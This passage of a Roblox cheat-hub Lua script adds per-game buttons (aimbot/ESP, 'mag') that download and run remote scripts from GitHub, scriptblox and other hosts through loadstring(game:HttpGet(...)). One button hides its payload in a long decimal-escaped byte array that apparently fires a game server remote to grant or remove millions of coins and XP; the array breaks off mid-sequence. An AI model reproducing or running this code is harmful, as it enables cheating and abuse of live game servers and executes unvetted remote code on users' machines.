       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/giogio11223/wartycoongiomadethis/refs/heads/main/aaaaa",true))()
 
       end, 
    })
    
    -- Big paintball 2
elseif game.GameId==3645347821 then
    local gameTab = Window:CreateTab("Big paintball 2", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Big paintball 2!")
 
    local Button = gameTab:CreateButton({
       Name = "aimbot esp",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
       end, 
    })
    
    -- Sharkbite 2
elseif game.GameId==3365661357 then
    local gameTab = Window:CreateTab("Sharkbite 2", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Sharkbite 2!")
 
    local Button = gameTab:CreateButton({
       Name = "Sharkbite 2",
       Callback = function()
          loadstring(game:HttpGet('https://scriptblox.com/raw/STEALTH-SharkBite-2-script-13895'))()
       end, 
    })
 
    local Button = gameTab:CreateButton({
       Name = "Sharkbite 2 w",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/raimbowo1/test/main/naval"))()
       end, 
    })
    
     -- untilted tag game
elseif game.GameId==4864117649 then
    local gameTab = Window:CreateTab("untilted tag game", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("untilted tag game!")
 
    local Button = gameTab:CreateButton({
       Name = "untilted tag game w",
       Callback = function()
          loadstring(game:HttpGet('https://whimper.xyz/cathub.lua'))()
       end, 
    })
 
    local Button = gameTab:CreateButton({
       Name = "untilted tag game",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Zer0ids/Qwerty/main/UntitledTag/NewScript.lua"))()
       end, 
    })
 
    
 
    
     -- Clicker Madness
elseif game.GameId==1919581078 then
    local gameTab = Window:CreateTab("Clicker Madness", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Clicker Madness")
 
    local Button = gameTab:CreateButton({
       Name = "CLICK MUTIPLE TIMES OP ASF! ",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
       end, 
    })
    
 
    
    -- Piggy
elseif game.GameId==1516533665 then
    local gameTab = Window:CreateTab("Piggy", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Piggy")
 
    local Button = gameTab:CreateButton({
       Name = "PIGGY!",
       Callback = function()
          loadstring(game:HttpGet("https://rawscripts.net/raw/Piggy-open-source-15390"))()
       end, 
    })
 
 -- football fusion
elseif game.GameId==3150475059 then
 local gameTab = Window:CreateTab("football fusion", 4483362458) -- Title, Image
 local Section = gameTab:CreateSection("football fusion")

 local Button = gameTab:CreateButton({
    Name = "mag gets u banned and idk what else!",
    Callback = function()
       loadstring(game:HttpGet("https://scriptblox.com/raw/Football-Fusion-2-bleachhax-21143"))()
    end, 
 })

 -- destrucion simulater
elseif game.GameId==5750914919 then
    local gameTab = Window:CreateTab("destrucion simulater", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("destrucion simulater")
 
    local Button = gameTab:CreateButton({
       Name = "destrucion simulater! op",
       Callback = function()
 GrzRXsjpdQZZZZZzzzZ={"\108","\111","\99","\97","\108","\32","\76","\105","\98","\114","\97","\114","\121","\32","\61","\32","\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\34","\104","\116","\116","\112","\115","\58","\47","\47","\114","\97","\119","\46","\103","\105","\116","\104","\117","\98","\117","\115","\101","\114","\99","\111","\110","\116","\101","\110","\116","\46","\99","\111","\109","\47","\120","\72","\101","\112","\116","\99","\47","\75","\97","\118","\111","\45","\85","\73","\45","\76","\105","\98","\114","\97","\114","\121","\47","\109","\97","\105","\110","\47","\115","\111","\117","\114","\99","\101","\46","\108","\117","\97","\34","\41","\41","\40","\41","\10","\108","\111","\99","\97","\108","\32","\87","\105","\110","\100","\111","\119","\32","\61","\32","\76","\105","\98","\114","\97","\114","\121","\46","\67","\114","\101","\97","\116","\101","\76","\105","\98","\40","\34","\68","\101","\115","\116","\114","\117","\99","\116","\105","\111","\110","\32","\83","\105","\109","\117","\108","\97","\116","\111","\114","\34","\44","\32","\34","\79","\99","\101","\97","\110","\34","\41","\10","\10","\45","\45","\84","\65","\66","\83","\10","\108","\111","\99","\97","\108","\32","\67","\88","\32","\61","\32","\87","\105","\110","\100","\111","\119","\58","\78","\101","\119","\84","\97","\98","\40","\34","\67","\111","\105","\110","\115","\32","\38","\32","\88","\80","\34","\41","\10","\108","\111","\99","\97","\108","\32","\67","\32","\61","\32","\67","\88","\58","\78","\101","\119","\83","\101","\99","\116","\105","\111","\110","\40","\34","\67","\111","\105","\110","\115","\34","\41","\10","\108","\111","\99","\97","\108","\32","\88","\32","\61","\32","\67","\88","\58","\78","\101","\119","\83","\101","\99","\116","\105","\111","\110","\40","\34","\88","\80","\34","\41","\10","\108","\111","\99","\97","\108","\32","\78","\32","\61","\32","\67","\88","\58","\78","\101","\119","\83","\101","\99","\116","\105","\111","\110","\40","\34","\78","\101","\103","\97","\116","\105","\118","\101","\115","\34","\41","\10","\10","\108","\111","\99","\97","\108","\32","\80","\108","\114","\32","\61","\32","\87","\105","\110","\100","\111","\119","\58","\78","\101","\119","\84","\97","\98","\40","\34","\80","\108","\97","\121","\101","\114","\34","\41","\10","\108","\111","\99","\97","\108","\32","\80","\108","\114","\77","\111","\100","\32","\61","\32","\80","\108","\114","\58","\78","\101","\119","\83","\101","\99","\116","\105","\111","\110","\40","\34","\77","\111","\100","\105","\102","\105","\99","\97","\116","\105","\111","\110","\115","\34","\41","\10","\108","\111","\99","\97","\108","\32","\80","\108","\114","\79","\116","\104","\101","\114","\32","\61","\32","\80","\108","\114","\58","\78","\101","\119","\83","\101","\99","\116","\105","\111","\110","\40","\34","\79","\116","\104","\101","\114","\34","\41","\10","\10","\108","\111","\99","\97","\108","\32","\84","\112","\32","\61","\32","\87","\105","\110","\100","\111","\119","\58","\78","\101","\119","\84","\97","\98","\40","\34","\84","\101","\108","\101","\112","\111","\114","\116","\115","\34","\41","\10","\108","\111","\99","\97","\108","\32","\84","\112","\77","\97","\105","\110","\32","\61","\32","\84","\112","\58","\78","\101","\119","\83","\101","\99","\116","\105","\111","\110","\40","\34","\77","\97","\105","\110","\34","\41","\10","\108","\111","\99","\97","\108","\32","\84","\112","\65","\114","\101","\97","\32","\61","\32","\84","\112","\58","\78","\101","\119","\83","\101","\99","\116","\105","\111","\110","\40","\34","\65","\114","\101","\97","\115","\34","\41","\10","\108","\111","\99","\97","\108","\32","\84","\112","\82","\97","\110","\107","\32","\61","\32","\84","\112","\58","\78","\101","\119","\83","\101","\99","\116","\105","\111","\110","\40","\34","\82","\97","\110","\107","\32","\65","\114","\101","\97","\115","\34","\41","\10","\10","\108","\111","\99","\97","\108","\32","\77","\111","\100","\32","\61","\32","\87","\105","\110","\100","\111","\119","\58","\78","\101","\119","\84","\97","\98","\40","\34","\77","\111","\100","\115","\34","\41","\10","\108","\111","\99","\97","\108","\32","\77","\111","\100","\83","\101","\108","\108","\32","\61","\32","\77","\111","\100","\58","\78","\101","\119","\83","\101","\99","\116","\105","\111","\110","\40","\34","\83","\101","\108","\108","\105","\110","\103","\34","\41","\10","\108","\111","\99","\97","\108","\32","\77","\111","\100","\87","\101","\97","\112","\111","\110","\32","\61","\32","\77","\111","\100","\58","\78","\101","\119","\83","\101","\99","\116","\105","\111","\110","\40","\34","\87","\101","\97","\112","\111","\110","\32","\77","\111","\100","\115","\34","\41","\10","\108","\111","\99","\97","\108","\32","\77","\111","\100","\66","\111","\111","\115","\116","\32","\61","\32","\77","\111","\100","\58","\78","\101","\119","\83","\101","\99","\116","\105","\111","\110","\40","\34","\66","\111","\111","\115","\116","\32","\77","\111","\100","\115","\34","\41","\10","\10","\108","\111","\99","\97","\108","\32","\83","\101","\116","\116","\105","\110","\103","\32","\61","\32","\87","\105","\110","\100","\111","\119","\58","\78","\101","\119","\84","\97","\98","\40","\34","\83","\101","\116","\116","\105","\110","\103","\115","\34","\41","\10","\108","\111","\99","\97","\108","\32","\83","\101","\116","\116","\105","\110","\103","\32","\61","\32","\83","\101","\116","\116","\105","\110","\103","\58","\78","\101","\119","\83","\101","\99","\116","\105","\111","\110","\40","\34","\71","\85","\73","\34","\41","\10","\10","\45","\45","\67","\79","\73","\78","\83","\32","\38","\32","\88","\80","\32","\84","\65","\66","\32","\66","\69","\71","\73","\78","\83","\10","\67","\58","\78","\101","\119","\66","\117","\116","\116","\111","\110","\40","\34","\43","\49","\32","\77","\105","\108","\108","\105","\111","\110","\34","\44","\32","\34","\83","\101","\114","\118","\101","\114","\32","\83","\105","\100","\101","\100","\33","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\49","\48","\48","\48","\48","\48","\48","\41","\10","\101","\110","\100","\41","\10","\10","\67","\58","\78","\101","\119","\66","\117","\116","\116","\111","\110","\40","\34","\43","\49","\48","\32","\77","\105","\108","\108","\105","\111","\110","\34","\44","\32","\34","\83","\101","\114","\118","\101","\114","\32","\83","\105","\100","\101","\100","\33","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\49","\48","\48","\48","\48","\48","\48","\48","\41","\10","\101","\110","\100","\41","\10","\10","\67","\58","\78","\101","\119","\66","\117","\116","\116","\111","\110","\40","\34","\43","\49","\48","\48","\32","\77","\105","\108","\108","\105","\111","\110","\34","\44","\32","\34","\83","\101","\114","\118","\101","\114","\32","\83","\105","\100","\101","\100","\33","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\49","\48","\48","\48","\48","\48","\48","\48","\41","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\49","\48","\48","\48","\48","\48","\48","\48","\41","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\49","\48","\48","\48","\48","\48","\48","\48","\41","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\49","\48","\48","\48","\48","\48","\48","\48","\41","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\49","\48","\48","\48","\48","\48","\48","\48","\41","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\49","\48","\48","\48","\48","\48","\48","\48","\41","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\49","\48","\48","\48","\48","\48","\48","\48","\41","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\49","\48","\48","\48","\48","\48","\48","\48","\41","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\49","\48","\48","\48","\48","\48","\48","\48","\41","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\49","\48","\48","\48","\48","\48","\48","\48","\41","\32","\10","\101","\110","\100","\41","\10","\10","\88","\58","\78","\101","\119","\66","\117","\116","\116","\111","\110","\40","\34","\43","\49","\32","\88","\80","\34","\44","\32","\34","\83","\101","\114","\118","\101","\114","\32","\83","\105","\100","\101","\100","\33","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\76","\101","\118","\101","\108","\115","\34","\44","\32","\52","\56","\48","\44","\32","\49","\41","\10","\101","\110","\100","\41","\10","\10","\88","\58","\78","\101","\119","\66","\117","\116","\116","\111","\110","\40","\34","\43","\49","\48","\32","\88","\80","\34","\44","\32","\34","\83","\101","\114","\118","\101","\114","\32","\83","\105","\100","\101","\100","\33","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\76","\101","\118","\101","\108","\115","\34","\44","\32","\52","\56","\48","\44","\32","\49","\48","\41","\10","\101","\110","\100","\41","\10","\10","\88","\58","\78","\101","\119","\66","\117","\116","\116","\111","\110","\40","\34","\77","\97","\120","\32","\88","\80","\34","\44","\32","\34","\83","\101","\114","\118","\101","\114","\32","\83","\105","\100","\101","\100","\33","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\76","\101","\118","\101","\108","\115","\34","\44","\32","\52","\56","\48","\44","\32","\49","\48","\41","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\76","\101","\118","\101","\108","\115","\34","\44","\32","\52","\56","\48","\44","\32","\49","\48","\41","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\76","\101","\118","\101","\108","\115","\34","\44","\32","\52","\56","\48","\44","\32","\49","\48","\41","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\76","\101","\118","\101","\108","\115","\34","\44","\32","\52","\56","\48","\44","\32","\49","\48","\41","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\76","\101","\118","\101","\108","\115","\34","\44","\32","\52","\56","\48","\44","\32","\49","\48","\41","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\76","\101","\118","\101","\108","\115","\34","\44","\32","\52","\56","\48","\44","\32","\49","\48","\41","\32","\10","\101","\110","\100","\41","\10","\10","\78","\58","\78","\101","\119","\66","\117","\116","\116","\111","\110","\40","\34","\45","\49","\32","\77","\105","\108","\108","\105","\111","\110","\34","\44","\32","\34","\83","\101","\114","\118","\101","\114","\32","\83","\105","\100","\101","\100","\33","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\45","\49","\48","\48","\48","\48","\48","\48","\41","\10","\101","\110","\100","\41","\10","\10","\78","\58","\78","\101","\119","\66","\117","\116","\116","\111","\110","\40","\34","\45","\49","\48","\32","\77","\105","\108","\108","\105","\111","\110","\34","\44","\32","\34","\83","\101","\114","\118","\101","\114","\32","\83","\105","\100","\101","\100","\33","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\45","\49","\48","\48","\48","\48","\48","\48","\48","\41","\10","\101","\110","\100","\41","\10","\10","\78","\58","\78","\101","\119","\66","\117","\116","\116","\111","\110","\40","\34","\45","\49","\48","\48","\32","\77","\105","\108","\108","\105","\111","\110","\34","\44","\32","\34","\83","\101","\114","\118","\101","\114","\32","\83","\105","\100","\101","\100","\33","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\45","\49","\48","\48","\48","\48","\48","\48","\48","\41","\32","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\45","\49","\48","\48","\48","\48","\48","\48","\48","\41","\32","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\45","\49","\48","\48","\48","\48","\48","\48","\48","\41","\32","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\45","\49","\48","\48","\48","\48","\48","\48","\48","\41","\32","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\45","\49","\48","\48","\48","\48","\48","\48","\48","\41","\32","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\45","\49","\48","\48","\48","\48","\48","\48","\48","\41","\32","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\45","\49","\48","\48","\48","\48","\48","\48","\48","\41","\32","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\45","\49","\48","\48","\48","\48","\48","\48","\48","\41","\32","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\45","\49","\48","\48","\48","\48","\48","\48","\48","\41","\32","\32","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\115","\34","\44","\32","\52","\56","\48","\44","\32","\45","\49","\48","\48","\48","\48","\48","\48","\48","\41","\10","\101","\110","\100","\41","\10","\10","\78","\58","\78","\101","\119","\66","\117","\116","\116","\111","\110","\40","\34","\45","\49","\32","\88","\80","\34","\44","\32","\34","\83",